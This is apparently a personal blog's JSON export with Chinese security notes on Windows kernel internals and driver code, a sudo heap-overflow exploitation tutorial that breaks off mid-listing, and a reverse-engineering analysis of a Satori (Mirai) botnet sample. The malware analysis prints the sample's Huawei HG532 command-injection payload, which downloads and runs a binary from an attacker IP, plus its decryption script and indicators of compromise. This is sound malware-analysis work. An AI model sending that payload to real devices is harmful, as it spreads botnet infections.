{"meta":{"title":"Joe1sn's Cabinet","subtitle":"","description":"","author":"Joe1sn","url":"https://joe1sn.eu.org","root":"/"},"pages":[],"posts":[{"title":"win_kernel_1_baisc","slug":"windows-kernel-1-baisc","date":"2023-05-24T03:28:39.000Z","updated":"2023-05-24T04:16:02.334Z","comments":true,"path":"2023/05/24/windows-kernel-1-baisc/","link":"","permalink":"https://joe1sn.eu.org/2023/05/24/windows-kernel-1-baisc/","excerpt":"I. Windows系统结构","text":"I. Windows系统结构 I.a 大致结构 windows内核是从windows NT内核发展过来的，从开始就和硬件的发展息息相关。 Windows采用双模式（dual mode）结构来保护操作系统内核不受应用程序的错误而出现崩溃 windows的原始设计是一个支持多环境子系统的os，它还支持POSIX和OS/2环境子系统.为他们提供仿真执行环境 I.b windows内核组成结构 关于函数的开头 nt：内核提供的服务 Ldr：映像加载器函数 Csr：Windows子进程通讯函数 Dbg：调试函数 Etw：系统时间函数 Rtl：运行支持函数 执行体API函数接收的参数来自各种应用程序，通常会在程序的最开始处，对所接受的参数逐一探查他们的可访问性。 II. windows内核关键组件 HAL 硬件抽象层 HAL通常是一个独立的动态链接库，windows自身携带多种HAL，但是在系统安装的时候只会选择一种，改名为hal.dll。涉及中断控制器、单处理器/多处理器硬件断点。 内核（微内核） 在内核模块ntoskrnl.exe中的上层部分为执行体，下层最接近HAL的就是内核。负责进程调度、中断和异常处理，核心任务是尽可能让系统中的所有处理器变得高效。 windows内核使用抢占式调度，由于采用面向对象的设计，使得它主要面向两个对象：分发器 和 控制 两个对象 分发器对象：实现各种同步功能。影响线程调度，主要用于 事件(event) 突变体(mutant) 信号量(semaphore) 进程(process) 线程(thread) 队列(query) 门(gate) 定时器(timer) 控制对象：用于控制内核的操作，不影响线程调度。包括 异步调用(APC) 延迟过程调用(DPC) 中断对象 执行体 在内核模块ntoskrnl.exe中的上层部分，包含5种类型的函数 被导出的、可以在用户模式下调用的函数。位于 ntdll.dll 中。一般就是win API 没有被导出、可以在用户模式下调用的函数。比如常见的反调试函数，包括各种LRC(Local Process Call，本地调用过程)、各种查询函数和专业函数。 只能在内核模式下调用的导出函数。在windows DDK中有文档。 执行体之间内部调用，未被文档化的函数 一个组件的内置函数 其中组件包括 进程和线程管理器：负责进程/线程的CURD 内存管理：虚拟内存 安全引用监视器（SRM）：维护本地计算机的安全策略 I/O管理器 缓存管理器：允许磁盘将文件映射到内存中 配置管理器：负责注册表的实现 即插即用管理器 还有的函数负责对执行体进行管理 对象管理器：执行体对象的CURD LPC设施：负责同一设备的的客户进程和服务进程的消息传递，对应的是远程过程调用（RPC） 运行时库函数 执行体支持例程：内存的分配、互锁内存的转换 设备驱动程序 驱动文件（.sys），漏洞挖掘存在于IOCTL 文件系统/存储管理 主要是ntfs.sys。漏洞挖掘存在于CLFS（通用日志文件系统）。 网络 windows套接字、winInet、NetBIOS、RPC II. windows子系统 在上面的内核部分已经实现了对硬件的简单访问控制，那么就会在次基础上进行跟高层次的建设。 在PE文件的头部域Subssytem中指定了该程序会在那个子环境中运行。 子系统也分为用户模式和内核模式，核心部分是 win32k.sys。子系统的DLL链接到应用程序中，包括kernel32.dll user32.dll gdi32.dll advapi.dll，负责实现文档化的windows函数。 win32k.sys同时也负责向内核注入一系列出调函数(callout)，一旦调用了win32k.sys的任何一个系统服务，这个程序就会变成一个GDI线程 核心功能可以分为： 窗口管理 由windows子进程csrss.exe负责控制台窗口功能 1234子系统会话---&gt;交互式窗口站---&gt;默认桌面---&gt;顶级窗户口列表-&gt;子窗口 | |_&gt;登录窗口 | |_&gt;屏幕保护窗口 |-&gt;非交互式窗口--&gt;不可见桌面 图形设备接口(GDI) 主要是图形支持，设计Direct3D等 II. Windows发布历史 MicroSoft在操作系统领域中最开始起源于MS-DOS，随后演变出了两个分支，最开始的Win 95/98/Me，之后就是基于Windows NT的内核版本的Window XP/7/8/10/vista的版本。 版本 发布日期 主要特点 内核版本 Windows 1.0 1985年11月 初始版本，提供基本的图形用户界面和应用程序支持 1.0 Windows 2.0 1987年12月 引入了窗口重叠、图标和键盘快捷键等改进 2.0 Windows 3.0 1990年5月 支持多任务处理和TrueType字体，用户界面大幅改进 3.0 Windows 95 1995年8月 具有开始菜单、任务栏和32位应用程序支持的重要版本 4.0 Windows 98 1998年6月 引入了对USB设备和DVD光盘的支持，改进了系统稳定性 4.10 Windows 2000 2000年2月 强化了系统稳定性和安全性，提供了企业级特性 5.0 Windows XP 2001年10月 引入了全新的用户界面、系统恢复功能和多用户支持 5.1 Windows Vista 2007年1月 全新的用户界面、更高的安全性和系统稳定性 6.0 Windows 7 2009年10月 优化了用户界面和性能，改进了任务栏和窗口管理 6.1 Windows 8 2012年10月 引入了全新的开始屏幕和触摸优化的用户界面 6.2 Windows 10 2015年7月 统一了桌面和移动设备平台，引入了Windows应用商店 10.0 Windows 11 2021年10月 新的用户界面设计、改进的性能和安全性，支持Android应用 10.0","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"mirai_bota","slug":"mirai-bota","date":"2023-03-25T10:42:45.000Z","updated":"2023-05-31T08:26:12.239Z","comments":true,"path":"2023/03/25/mirai-bota/","link":"","permalink":"https://joe1sn.eu.org/2023/03/25/mirai-bota/","excerpt":"Mirai Botnet分支Satori分析 暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向","text":"Mirai Botnet分支Satori分析 暂时先更新这么多，后面应该还有相关作者被抓的一些消息和更多功能的逆向 基本情况 名称 x86_64 MD5 fe7ca3b588e342f79c7814bb75dc24d7 SHA256 e436196f047741070c580695f5444e0c2cdd175c88f68affdc9230d09a71c978 Domain botnet.nguyennghi.info ip 103.183.118.73 逆向分析 基本情况 64位ELF可执行文件 逆向工程 通过start找到main函数 使用IDApython脚本对类似的库函数实现进行函数重命名 1234567891011121314151617181920import idautilsimport idaapiimport ida_nameimport idcfor func_ea in idautils.Functions(): func = idaapi.get_func(func_ea) name = idaapi.get_func_name(func_ea) for head in idautils.Heads(func.start_ea, func.end_ea): try: code = idc.GetDisasm(head) if &quot;syscall&quot; in code: print(&quot;Function: &#123;&#125;&quot;.format(name).ljust(0x40,&#x27;-&#x27;)) print(code[21:].ljust(0x30,&quot;=&quot;)) ida_name.set_name(func.start_ea, code[21:]) idc.set_func_flags(func.start_ea, idc.get_func_flags(func_ea) | idaapi.FUNC_LIB) except: pass main函数 首先创建向8.8.8.8:13568的socket连接，通过getsockname测试网络是否连通并获得本机ip地址 初始化加密消息 由于使用未知版本的lib库进行静态编译，所以需要手动识别一些lib函数。 比如这里使用malloc分配并将密文使用strncpy将消息复制到堆中 利用pid和随机数进行随机数生成，对进程进行随机改名 将time生成的伪随机数和pid进行异或等操作得到随机数 通过位移等操作实现随机数的范围控制 在之后使用ptrcl进行进程的重命名 拼接指令过后，修改相关信号变量值，并在vfork的execl中执行 拼接命令字符串 设置信号量并使用vfork执行 vfork部分 执行的语句为 1/bin/sh sh -c rm -rf $root_random_name &amp;&amp; mkdir bin; &gt; $cur_random_name &amp;&amp; mv $pwd $root_random_name ; chmod 777 $root_random_name 例如 1/bin/sh sh -c rm -rf bin/watchdog &amp;&amp; mkdir bin \\336\\377\\377\\377\\177; &gt;bin/watchdog &amp;&amp; mv /home/test/Desktop/HackedByAlan/check/mirai bin/watchdog; chmod 777 bin/watchdog 随机选择 &quot;/bin/busybox&quot;;、&quot;/bin/watchdog&quot;、&quot;/bin/systemd&quot;中的一个（$root_random_name）中的一个删除 当前文件夹创建bin目录 将当前目录下的病毒移动至创建的bin目录中，并重命名$root_random_name 给予bin/$root_random_name最高权限 通过多次运行可以成功实现，如果&amp;&amp; mkdir bin \\336\\377\\377\\377\\177中没有乱码，那么就会执行后一句 使用异或解密字符串并打印，完成后加密字符串 过程 利用其自身的解密脚本，可以解密所有密文 1234567891011121314151617181920212223242526str1 = [ 0x4C, 0x41, 0x5A, 0x40, 0x4B, 0x5A, 0x00, 0x40, 0x49, 0x5B, 0x57, 0x4B, 0x40, 0x40, 0x49, 0x46, 0x47, 0x00, 0x47, 0x40, 0x48, 0x41, 0x2E]str2 = [0x4A, 0x41, 0x40, 0x4B]str3 = [0x01, 0x5E, 0x5C, 0x41, 0x4D, 0x01, 0x2E]str4 = [0x01, 0x4B, 0x56, 0x4B, 0x2E]str5 = [0x01, 0x48, 0x4A, 0x2E]str6 = [0x01, 0x4D, 0x43, 0x4A, 0x42, 0x47, 0x40, 0x4B, 0x2E]key = 0x6D53D2C2def decrypt(cipher:list): v3 = key &amp; 0xFF v4 = key &gt;&gt; 8 v5 = (key &gt;&gt; 16) &amp; 0xFFFF v6 = (key &gt;&gt; 24) &amp; 0xFF result = &quot;&quot; for i in cipher: result += chr((i^v3^v4^v5^v6 )&amp; 0xFF) return resultif __name__ == &#x27;__main__&#x27;: print(&quot;1&quot;, decrypt(str1)) print(&quot;2&quot;, decrypt(str2)) print(&quot;3&quot;, decrypt(str3)) print(&quot;4&quot;, decrypt(str4)) print(&quot;5&quot;, decrypt(str5)) print(&quot;6&quot;, decrypt(str6)) 加密字符串，由于是异或加密，所以加解密算法一致 合适函数表，讲函数放到一个table中 使用fork获得子进程，打开/proc文件夹并读取其中的文件，关闭除必要进程外的所有进程 打开/proc/文件夹 关闭除必要进程外的所有进程 使用SSDP协议进行网络发包，使用华为HG532远程命令执行漏洞（CVE-2017-17215）的payload进行发包，进行攻击 进行攻击 创建socket 设置 socket 选项，允许向组播地址发送数据 设置目标地址和端口号 构造 M-SEARCH 请求报文，发送搜索请求 payload分析 12345678910111213141516POST /ctrlt/DeviceUpgrade_1 HTTP/1.1Connection: keep-aliveAccept: */*Authorization: Digest username=&quot;dslf-config&quot;, realm=&quot;HuaweiHomeGateway&quot;, nonce=&quot;88645cefb1f9ede0e336e3569d75ee30&quot;, uri=&quot;/ctrlt/DeviceUpgrade_1&quot;, response=&quot;3612f843a42db38f48f59d2a3597e19c&quot;, algorithm=&quot;MD5&quot;, qop=&quot;auth&quot;, nc=00000001, cnonce=&quot;248d1a2560100669&quot;Content-Length: 457&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;s:Envelope xmlns:s=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; s:encodingStyle=&quot;http://schemas.xmlsoap.org/soap/encoding/&quot;&gt; &lt;s:Body&gt; &lt;u:Upgrade xmlns:u=&quot;urn:schemas-upnp-org:service:WANPPPConnection:1&quot;&gt; &lt;NewStatusURL&gt;$(/bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)&lt;/NewStatusURL&gt; &lt;NewDownloadURL&gt;$(echo HUAWEIUPNP)&lt;/NewDownloadURL&gt; &lt;/u:Upgrade&gt; &lt;/s:Body&gt;&lt;/s:Envelope&gt; 核心语句 /bin/busybox wget -g 103.183.118.73 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei 网络连接相关 DNS SERVER anuj.ns.cloudflare.com. 173.245.59.65 anuj.ns.cloudflare.com CLOUDFLARENET United States raphaela.ns.cloudflare.com. 108.162.194.192 raphaela.ns.cloudflare.com CLOUDFLARENET United States Host Records (A) nguyennghi.info HTTP: cloudflare 104.21.78.122 CLOUDFLARENET unknown antiddos.nguyennghi.info 103.161.181.140 DVS-AS-VN VIET DIGITAL TECHNOLOGY LIABILITY COMPANY Vietnam checkht4gvpn.nguyennghi.info HTTP: cloudflare 172.67.220.248 CLOUDFLARENET United States","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/tags/notes/"},{"name":"git","slug":"git","permalink":"https://joe1sn.eu.org/tags/git/"}]},{"title":"windows_kernel_driver_2","slug":"windows-kernel-driver-2","date":"2023-02-17T07:21:36.000Z","updated":"2023-02-17T07:53:44.216Z","comments":true,"path":"2023/02/17/windows-kernel-driver-2/","link":"","permalink":"https://joe1sn.eu.org/2023/02/17/windows-kernel-driver-2/","excerpt":"[驱动开发] 2 探索CR4 探索页面 CR3寄存器于页遍历 虚拟地址-&gt;物理地址","text":"[驱动开发] 2 探索CR4 探索页面 CR3寄存器于页遍历 虚拟地址-&gt;物理地址 [驱动开发]探索CR4 英特尔® 64 位和 IA-32 架构开发人员手册合订本 第3卷第四章第五小节《4-LEVEL PAGING AND 5-LEVEL PAGING》 判断CPU是四级分页还是五级分页 page: 3074 该寄存器的值决定了映射层级是4/5， 1：5级分页 0：4级分页 12345678//__readcr4() &amp; 0x1000//__readcr4() &amp; (1&lt;&lt;12)CR4 Cr4 = &#123; .Value = __readcr4() &#125;;DbgPrint(&quot;CR4=0x%016I64X, CR4.LA57=%I64d\\n&quot;, Cr4.Value, Cr4.Fields.LA57);if (Cr4.Fields.LA57) DbgPrint(&quot;The system using 5 Level Paging&quot;);else DbgPrint(&quot;The system using 4 Level Paging&quot;); [驱动开发]探索页面 CR3寄存器于页遍历 CR3 寄存器设计 CR3[512][512][512][512] 个人觉得这块儿和CSAPP上面讲的差不多 页号=页首地址页大小=页首地址4KB==页首地址212==页首地址&gt;&gt;12页号 = \\frac{页首地址}{页大小}= \\frac{页首地址}{4KB}== \\frac{页首地址}{2^{12}}== 页首地址&gt;&gt;12页号=页大小页首地址​=4KB页首地址​==212页首地址​==页首地址&gt;&gt;12 12345678910111213//1.得到CR3寄存器的值，从而得到一级页表地址CR3 Cr3 = &#123; .Value = __readcr3() &#125;;//2.对每一个一级页读取PL1PTE L1pt = MmGetVirtualForPhysical(L1ptPa.AsLargeInteger);for (int n1 = 0; n1 &lt; 512; n1++) &#123; if (!L1pt[n1].Fields.P || !L1pt[n1].Fields.U_S) continue; PA L2ptPa = &#123; .Fields4KB.PPN = L1pt[n1].Fields.PPN &#125;; DbgPrint(&quot;...&quot;); //3.得到二级页表地址 PL2PTE L2pt = MmGetVirtualForPhysical(L2ptPa.AsLargeInteger); //4.类似嵌套循环，遍历 CR3的PPN是第12位，共40bit，所以一级页表是这个值。CR3的尾12位没有用全为0，同时24=162^{4} = 1624=16，那么向右移12位等效于16禁止右移124=3\\frac{12}{4}=3412​=3位 得到Level_1_PageTable的值过后，可以使用函数MmGetVirtualForPhysical获得该内存地址的值，从而遍历一级页表。要判断当前L1pt.P是否有效，同时L1pt.U_S可以判断该页的权限，详细可以看开发者手册 Table 4-20 依次循环可以遍历完整个内存页（下图中L4pt放不下了） 虚拟地址-&gt;物理地址 程序按照4KB分页个数太多不利于实验，可以强制将其分页为1GB，这样便于翻译 编写一个测试程序，该程序能申请出一页的内存，并打印其值 使用PsGetCurrentProcess获得当前进程PROCESS对象，若相等则不启用新方法 使用KeStackAttachProcess附加到要翻译的内存的PROCESS对象中，使用老方法输出就OK了，最后KeUnstackDetachProcess脱离 ?如何使用按照名字查找进程 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &quot;win10.h&quot;NTSTATUSQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID* SystemInformation)&#123; NTSTATUS Status; PVOID Buffer; ULONG BufferSize = 4096; do &#123; Buffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, BufferSize, &#x27;bisQ&#x27;); if (!Buffer) return STATUS_NO_MEMORY; Status = NtQuerySystemInformation(SystemInformationClass, Buffer, BufferSize, &amp;BufferSize); if (NT_SUCCESS(Status)) &#123; *SystemInformation = Buffer; return Status; &#125; ExFreePool(Buffer); if (STATUS_INFO_LENGTH_MISMATCH != Status) return Status; &#125; while (TRUE);&#125;NTSTATUSLookUpProcessByImageName(PCWSTR ImageName, PEPROCESS* Process)&#123; NTSTATUS Status; PSYSTEM_PROCESS_INFORMATION ProcessInformationArray = NULL; Status = QuerySystemInformation(SystemProcessInformation, &amp;ProcessInformationArray); if (!NT_SUCCESS(Status)) return Status; PSYSTEM_PROCESS_INFORMATION CurrentInformation = ProcessInformationArray; UNICODE_STRING ImageNameUnicodeString; RtlInitUnicodeString(&amp;ImageNameUnicodeString, ImageName); while (TRUE) &#123; if (RtlCompareUnicodeString(&amp;CurrentInformation-&gt;ImageName, &amp;ImageNameUnicodeString, FALSE) == 0) &#123; Status = PsLookupProcessByProcessId(CurrentInformation-&gt;UniqueProcessId, Process); ExFreePool(ProcessInformationArray); return Status; &#125; if (CurrentInformation-&gt;NextEntryOffset == 0) &#123; ExFreePool(ProcessInformationArray); return STATUS_NOT_FOUND; &#125; CurrentInformation = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)CurrentInformation + CurrentInformation-&gt;NextEntryOffset); &#125;&#125; 大致思路和win32下按名称查找PID差不多 具体过程 这里以0x00000254000003BC Str1 为例子，加载插件打印，耐心等待。。。 这时候的数据大小就有83KB了 format(0x00000254000003BC, &quot;064b&quot;)，内存前16位为空是没有用的 高9位 VPN1=4VPN1=4VPN1=4 int(format(0x00000254000003BC, &quot;064b&quot;)[16:][:9],2) 再9位 VPN2=336VPN2=336VPN2=336 int(format(0x00000254000003BC, &quot;064b&quot;)[16:][9:18],2) 该页表的PS=1，则不需要查找下一个页表了（而且后面也没有了） 得到的Pa就是物理页的首地址 + 剩余的30bit位作为VPO = 物理地址 hex(0x00000001C0000000+int(format(0x00000254000003BC, &quot;064b&quot;)[16:][18:],2)) 得到PA+VPO = 0x1c00003bc 暂停系统，Windbg -&gt; memory window -&gt; 右键 -&gt; proeries -&gt; physical memory 尝试修改 再次刷新应该就是1234了 成功修改 官方文档 2938/4834","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"windows内核驱动 1-环境搭建","slug":"windows_kernel_driver_1","date":"2023-02-16T04:07:43.000Z","updated":"2023-02-17T07:36:47.386Z","comments":true,"path":"2023/02/16/windows_kernel_driver_1/","link":"","permalink":"https://joe1sn.eu.org/2023/02/16/windows_kernel_driver_1/","excerpt":"[驱动开发] 1-环境搭建 简而言之就是 visual stdio 2019 windows SDK windows WDK 如果vs没有kernel的项目的模板，找到vs目录的WDK.vsix即可","text":"[驱动开发] 1-环境搭建 简而言之就是 visual stdio 2019 windows SDK windows WDK 如果vs没有kernel的项目的模板，找到vs目录的WDK.vsix即可 关于调试 windbg调试器 同时windows 虚拟机我使用的是 vmware，添加了一个COM串口 加载驱动 使用KmdKit windows设置 msconfig -&gt; 调试 -&gt; COM2 … 最简单的hello world 打开vs，找到KMDF （kernel mode driver empty） 设置驱动项目 取消晚上12点后编译报错 项目 -&gt; 属性 -&gt; Inf2Cat -&gt; Use Local Time 代码 main.c 12345678910111213141516171819202122#include &lt;ntifs.h&gt;// 驱动卸载函数VOIDDriverUnload(PDRIVER_OBJECT DriverObject)&#123; UNREFERENCED_PARAMETER(DriverObject); DbgPrint(&quot;Bye\\n&quot;);&#125;// 驱动入口函数// System 在内核模式下运行该函数NTSTATUSDriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)&#123; UNREFERENCED_PARAMETER(RegistryPath); //宏防止编译器报错 DbgPrint(&quot;Hello World!\\n&quot;); //调式输出 DriverObject-&gt;DriverUnload = DriverUnload; //驱动卸载函数 return STATUS_SUCCESS; //加载成功返回码&#125; Class改为 Class=System ClassInstall32 直接删除两行（就是直接把这个属性删除了） 使用加载器加载 使用KmdManager 使用windbg x64调试 File -&gt; Kernel Debug F5继续过后在虚拟机里面运行","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"},{"name":"kernel","slug":"notes/kernel","permalink":"https://joe1sn.eu.org/categories/notes/kernel/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://joe1sn.eu.org/tags/kernel/"},{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"}]},{"title":"SUDO堆溢出提权：从fuzz到exp [3]","slug":"sudo-fuzz2exp-3","date":"2022-04-13T23:40:53.000Z","updated":"2022-09-20T08:04:55.198Z","comments":true,"path":"2022/04/14/sudo-fuzz2exp-3/","link":"","permalink":"https://joe1sn.eu.org/2022/04/14/sudo-fuzz2exp-3/","excerpt":"SUDO堆溢出提权：从fuzz到exp [3] 前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit","text":"SUDO堆溢出提权：从fuzz到exp [3] 前文：https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ 受到youtuber：LiveOverflow的系列教程的启发，我发现在中文互联网上并没有相关的翻译教程，所以我想以实验报告的形式来创造这个从fuzz到exp的系列图文教程 原始视频合集：https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx 原始Blog：https://liveoverflow.com/why-pick-sudo-research-target-part-1/ 原作者代码仓库：https://github.com/LiveOverflow/pwnedit My previous blog: https://blog.joe1sn.top/2022/01/04/CVE-2021-3156/ I was inspired by the LiveOverflow’s Sudo Vulnerability Walkthrough on youtube, but i found there’s no Chinese version of this walkthrough tutorial, so i decided to write in experimental report way to create this “from fuzz to exploit” series. Original Videos: https://www.youtube.com/watch?v=uj1FTiczJSE&amp;list=PLhixgUqwRTjy0gMuT4C3bmjeZjuNQyqdx Original Blog: https://liveoverflow.com/why-pick-sudo-research-target-part-1/ Source Project Code: https://github.com/LiveOverflow/pwnedit 本节内容： Discussing Heap Exploit Strategies for sudo - Ep. 09 Developing a Tool to Find Function Pointers on The Heap | Ep. 10 Fuzzing Heap Layout to Overflow Function Pointers | Ep. 11 Developing GDB Extension for Heap Exploitation | Ep. 12 编写exp思路 对于CTF中常见的堆思路是通过堆分配算法，使用free、malloc进行exp的编写，所以一般会出现一些菜单让你使用这些功能。本质上是攻击堆分配算法 但是在漏洞利用中，只存在这一个堆溢出，我们无法进行系列的free、malloc，所以思路是能否攻击堆内的有效数据，尝试找到堆内的函数指针或者其他有用的数据。本质上是攻击堆上的数据 GDB调试 不适用asan重新编译后，使用GEF分析crash时堆的分布 一个很明显的堆溢出，再看看出发时的堆分布 断点 堆chunk 再次到达断点，堆溢出 困难与解决 这样的堆分配情况让我们很难使用堆风水去调整堆分配，并且在程序运行中会遇到各种何样的内存分配情况，哪怕是不一样的长度都会造成堆分配的不同，进而让数据分配到不同的地方。 如何解决，有两个思路 作者收到了原文报告的启发，尝试编写小工具去“控制”堆 To implement this initial technique, we wrote a rudimentary brute-forcer that executes Sudo inside gdb, overflows the “user_args” buffer, and randomly selects the following parameters: 通过覆写其他堆中的函数指针来实现rce或者提权 函数指针工具编写 思路分析 从gdb的vmmap指令我们知道程序有哪些代码段 如果在堆内存中带有x即可执行权限的话就可能存在能够被我们利用的函数指针 工具编写 写入但是没有溢出的情况下，在漏洞函数断点，dump内存 1dump binary memory /pwd/heap 0x005555555f9000 0x00555555637000 复制vmmap结果，尝试分析出有可执行权限的内存地址 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354550x00555555554000 0x0055555555b000 0x00000000000000 r-- /pwd/sudo_test/src/sudo0x0055555555b000 0x005555555d6000 0x00000000007000 r-x /pwd/sudo_test/src/sudo0x005555555d6000 0x005555555f4000 0x00000000082000 r-- /pwd/sudo_test/src/sudo0x005555555f4000 0x005555555f5000 0x0000000009f000 r-- /pwd/sudo_test/src/sudo0x005555555f5000 0x005555555f9000 0x000000000a0000 rw- /pwd/sudo_test/src/sudo0x005555555f9000 0x00555555637000 0x00000000000000 rw- [heap]0x007ffff7cc1000 0x007ffff7d02000 0x00000000000000 rw-0x007ffff7d02000 0x007ffff7d05000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d05000 0x007ffff7d0c000 0x00000000003000 r-x /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0c000 0x007ffff7d0e000 0x0000000000a000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0e000 0x007ffff7d0f000 0x0000000000b000 r-- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d0f000 0x007ffff7d10000 0x0000000000c000 rw- /usr/lib/x86_64-linux-gnu/libnss_files-2.31.so0x007ffff7d10000 0x007ffff7d16000 0x00000000000000 rw-0x007ffff7d16000 0x007ffff7d1d000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache0x007ffff7d1d000 0x007ffff7d4f000 0x00000000000000 r-- /usr/lib/locale/C.UTF-8/LC_CTYPE0x007ffff7d4f000 0x007ffff7d51000 0x00000000000000 rw-0x007ffff7d51000 0x007ffff7d73000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7d73000 0x007ffff7eeb000 0x00000000022000 r-x /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7eeb000 0x007ffff7f39000 0x0000000019a000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f39000 0x007ffff7f3d000 0x000000001e7000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3d000 0x007ffff7f3f000 0x000000001eb000 rw- /usr/lib/x86_64-linux-gnu/libc-2.31.so0x007ffff7f3f000 0x007ffff7f43000 0x00000000000000 rw-0x007ffff7f43000 0x007ffff7f45000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f45000 0x007ffff7f56000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f56000 0x007ffff7f5c000 0x00000000013000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5c000 0x007ffff7f5d000 0x00000000019000 --- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5d000 0x007ffff7f5e000 0x00000000019000 r-- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5e000 0x007ffff7f5f000 0x0000000001a000 rw- /usr/lib/x86_64-linux-gnu/libz.so.1.2.110x007ffff7f5f000 0x007ffff7f65000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f65000 0x007ffff7f76000 0x00000000006000 r-x /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f76000 0x007ffff7f7c000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7c000 0x007ffff7f7d000 0x0000000001c000 r-- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7d000 0x007ffff7f7e000 0x0000000001d000 rw- /usr/lib/x86_64-linux-gnu/libpthread-2.31.so0x007ffff7f7e000 0x007ffff7f82000 0x00000000000000 rw-0x007ffff7f82000 0x007ffff7f84000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f84000 0x007ffff7f99000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7f99000 0x007ffff7fb3000 0x00000000017000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb3000 0x007ffff7fb4000 0x00000000030000 r-- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb4000 0x007ffff7fb5000 0x00000000031000 rw- /usr/lib/x86_64-linux-gnu/libcrypt.so.1.1.00x007ffff7fb5000 0x007ffff7fbd000 0x00000000000000 rw-0x007ffff7fbd000 0x007ffff7fbe000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbe000 0x007ffff7fbf000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fbf000 0x007ffff7fc0000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc0000 0x007ffff7fc1000 0x00000000002000 r-- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc1000 0x007ffff7fc2000 0x00000000003000 rw- /usr/lib/x86_64-linux-gnu/libutil-2.31.so0x007ffff7fc2000 0x007ffff7fc4000 0x00000000000000 rw-0x007ffff7fca000 0x007ffff7fce000 0x00000000000000 r-- [vvar]0x007ffff7fce000 0x007ffff7fcf000 0x00000000000000 r-x [vdso]0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- /usr/lib/x86_64-linux-gnu/ld-2.31.so0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- 